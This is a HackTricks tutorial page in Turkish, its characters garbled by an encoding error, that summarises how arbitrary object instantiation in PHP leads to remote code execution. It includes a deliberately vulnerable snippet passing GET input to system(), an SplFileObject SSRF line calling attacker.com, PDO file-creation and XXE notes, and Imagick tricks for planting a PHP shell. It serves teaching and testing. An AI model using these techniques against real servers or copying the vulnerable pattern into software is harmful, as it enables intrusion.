# PHP - RCE nesne oluÅŸturma istismar: new $\_GET\["a"]\($\_GET\["b"])

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

Bu, [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) adresinin temel bir Ã¶zetidir.

## GiriÅŸ

`new $_GET["a"]($_GET["a"])` gibi yeni keyfi nesnelerin oluÅŸturulmasÄ±, [**yazÄ±da**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) detaylandÄ±rÄ±ldÄ±ÄŸÄ± gibi Uzaktan Kod YÃ¼rÃ¼tme (RCE) ile sonuÃ§lanabilir. Bu belge, RCE elde etmenin Ã§eÅŸitli stratejilerini vurgulamaktadÄ±r.

## Ã–zel SÄ±nÄ±flar veya Otomatik YÃ¼kleme ile RCE

`new $a($b)` sÃ¶zdizimi, **`$a`** sÄ±nÄ±f adÄ±nÄ± ve **`$b`** yapÄ±cÄ±ya geÃ§irilen ilk argÃ¼manÄ± temsil eden bir nesne oluÅŸturmak iÃ§in kullanÄ±lÄ±r. Bu deÄŸiÅŸkenler, GET/POST gibi kullanÄ±cÄ± girdilerinden, string veya dizi olarak veya JSON'dan, diÄŸer tÃ¼rler olarak elde edilebilir.

AÅŸaÄŸÄ±daki kod parÃ§asÄ±nÄ± dÃ¼ÅŸÃ¼nÃ¼n:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Bu durumda, `$a`'yÄ± `App` veya `App2` olarak ve `$b`'yi bir sistem komutu (Ã¶rneÄŸin, `uname -a`) olarak ayarlamak, o komutun Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±na neden olur.

**Otomatik yÃ¼kleme fonksiyonlarÄ±**, doÄŸrudan eriÅŸilebilen bÃ¶yle sÄ±nÄ±flar yoksa istismar edilebilir. Bu fonksiyonlar, ihtiyaÃ§ duyulduÄŸunda dosyalardan sÄ±nÄ±flarÄ± otomatik olarak yÃ¼kler ve `spl_autoload_register` veya `__autoload` kullanÄ±larak tanÄ±mlanÄ±r:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Autoloading'in davranÄ±ÅŸÄ± PHP sÃ¼rÃ¼mlerine gÃ¶re deÄŸiÅŸiklik gÃ¶sterir ve farklÄ± RCE olasÄ±lÄ±klarÄ± sunar.

## YerleÅŸik SÄ±nÄ±flar ile RCE

Ã–zel sÄ±nÄ±flar veya autoloader'lar eksik olduÄŸunda, **yerleÅŸik PHP sÄ±nÄ±flarÄ±** RCE iÃ§in yeterli olabilir. Bu sÄ±nÄ±flarÄ±n sayÄ±sÄ± PHP sÃ¼rÃ¼mÃ¼ne ve uzantÄ±lara baÄŸlÄ± olarak 100 ile 200 arasÄ±nda deÄŸiÅŸir. `get_declared_classes()` kullanÄ±larak listelenebilirler.

Ä°lgili yapÄ±cÄ±lar, aÅŸaÄŸÄ±daki Ã¶rnekte ve [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF) baÄŸlantÄ±sÄ±nda gÃ¶sterildiÄŸi gibi, yansÄ±ma API'si aracÄ±lÄ±ÄŸÄ±yla tanÄ±mlanabilir.

**Belirli yÃ¶ntemler aracÄ±lÄ±ÄŸÄ±yla RCE ÅŸunlarÄ± iÃ§erir:**

### **SSRF + Phar Deserialization**

`SplFileObject` sÄ±nÄ±fÄ±, yapÄ±cÄ±sÄ± aracÄ±lÄ±ÄŸÄ±yla SSRF'yi etkinleÅŸtirir ve herhangi bir URL'ye baÄŸlantÄ±lara izin verir:
```php
new SplFileObject('http://attacker.com/');
```
SSRF, Phar protokolÃ¼nÃ¼ kullanan PHP'nin 8.0'dan Ã¶nceki sÃ¼rÃ¼mlerinde deserialization saldÄ±rÄ±larÄ±na yol aÃ§abilir.

### **PDO'larÄ± SÃ¶mÃ¼rmek**

PDO sÄ±nÄ±fÄ± yapÄ±cÄ± fonksiyonu, DSN dizeleri aracÄ±lÄ±ÄŸÄ±yla veritabanlarÄ±na baÄŸlantÄ±lara izin verir, bu da dosya oluÅŸturma veya diÄŸer etkileÅŸimleri mÃ¼mkÃ¼n kÄ±labilir:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

PHP'nin 5.3.22 ve 5.4.12 sÃ¼rÃ¼mleri, libxml2 sÃ¼rÃ¼mÃ¼ne baÄŸlÄ± olarak `SoapClient` ve `SimpleXMLElement` yapÄ±cÄ±larÄ± aracÄ±lÄ±ÄŸÄ±yla XXE saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±zdÄ±.

## RCE via Imagick Extension

**Projenin baÄŸÄ±mlÄ±lÄ±klarÄ±** analizi sÄ±rasÄ±nda, **Imagick**'in yeni nesne Ã¶rnekleri oluÅŸturarak **komut yÃ¼rÃ¼tme** iÃ§in kullanÄ±labileceÄŸi keÅŸfedildi. Bu, gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanma fÄ±rsatÄ± sunar.

### VID parser

Dosya sisteminde belirtilen herhangi bir yola iÃ§erik yazma yeteneÄŸine sahip VID parser'Ä±n varlÄ±ÄŸÄ± tespit edildi. Bu, web eriÅŸilebilir bir dizine bir PHP shell yerleÅŸtirilmesine yol aÃ§abilir ve Uzak Kod YÃ¼rÃ¼tme (RCE) saÄŸlanabilir.

#### VID Parser + Dosya YÃ¼kleme

PHP'nin yÃ¼klenen dosyalarÄ± geÃ§ici olarak `/tmp/phpXXXXXX` dizininde sakladÄ±ÄŸÄ± belirtilmiÅŸtir. Imagick'teki VID parser, **msl** protokolÃ¼nÃ¼ kullanarak dosya yollarÄ±nda joker karakterleri iÅŸleyebilir ve geÃ§ici dosyayÄ± seÃ§ilen bir konuma taÅŸÄ±yabilir. Bu yÃ¶ntem, dosya sisteminde keyfi dosya yazma elde etmek iÃ§in ek bir yaklaÅŸÄ±m sunar.

### PHP Ã‡Ã¶kmesi + Kaba Kuvvet

[**orijinal yazÄ±mda**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) tanÄ±mlanan bir yÃ¶ntem, silinmeden Ã¶nce bir sunucu Ã§Ã¶kmesine neden olan dosyalarÄ±n yÃ¼klenmesini iÃ§erir. GeÃ§ici dosyanÄ±n adÄ±nÄ± kaba kuvvetle tahmin ederek, Imagick'in keyfi PHP kodu yÃ¼rÃ¼tmesi mÃ¼mkÃ¼n hale gelir. Ancak, bu tekniÄŸin yalnÄ±zca eski bir ImageMagick sÃ¼rÃ¼mÃ¼nde etkili olduÄŸu bulunmuÅŸtur.

## References

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
